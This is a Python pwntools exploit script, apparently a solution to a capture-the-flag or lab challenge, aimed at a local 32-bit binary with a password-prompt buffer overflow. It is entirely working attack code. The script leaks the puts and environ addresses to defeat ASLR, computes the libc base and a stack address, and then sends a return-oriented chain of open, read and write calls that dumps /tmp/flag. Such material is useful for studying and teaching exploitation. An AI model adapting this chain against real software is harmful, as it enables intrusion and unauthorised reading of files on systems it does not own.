from pwn import *
# 
io = process('./a32.out')
elf = ELF('./a32.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# PR in elf
PR = 0x0804901e
# relative address of libc
PPR = 0x3958a
PPPR = 0x4cab8
writable_addr = 0x804c700
# debug
# gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
# 1: get the address of puts and calculate the base address of libc
payload = cyclic(76) 
payload += p32(elf.plt['puts'])
payload += p32(PR)
payload += p32(elf.got['puts'])
payload += p32(elf.symbols['start'])
io.sendlineafter(b'Password:', payload)
io.recvuntil(b'Password!\n')
puts_addr = u32(io.recv(4))
base_addr = puts_addr - libc.symbols['puts']
print('puts_addr = ', hex(puts_addr))
print('base_addr = ', hex(base_addr))
# 2: get the stack address and calculate the address of string
environ = base_addr + libc.symbols['environ']
payload = cyclic(76) 
payload += p32(elf.plt['puts'])
payload += p32(PR)
payload += p32(environ)
payload += p32(elf.symbols['start'])
io.sendlineafter(b'Password:', payload)
io.recvuntil(b'Password!\n')
stack_addr = u32(io.recv(4))
print('stack_addr = ', hex(stack_addr))
# 3: get the address of string and calculate the address of writable_addr
string_addr = stack_addr - 284
print('string_addr = ', hex(string_addr))
# 4: get the flag
fileName = b'/tmp/flag\0' 
payload = fileName + cyclic(76 - len(fileName)) 
# open the /tmp/flag
# open("/tmp/flag", 0)
payload += p32(base_addr + libc.symbols['open'])
payload += p32(base_addr + PPR)
payload += p32(string_addr)
payload += p32(0)
# read the flag
# read(3, writable_addr, 10)
payload += p32(base_addr + libc.symbols['read'])
payload += p32(base_addr +PPPR)
payload += p32(3)
payload += p32(writable_addr)
payload += p32(10)
# write the flag
# write(1, writable_addr, 10)
payload += p32(base_addr + libc.symbols['write'])
payload += p32(base_addr + PPPR)
payload += p32(1)
payload += p32(writable_addr)
payload += p32(10)
io.sendafter(b'Password:', payload)
io.interactive()


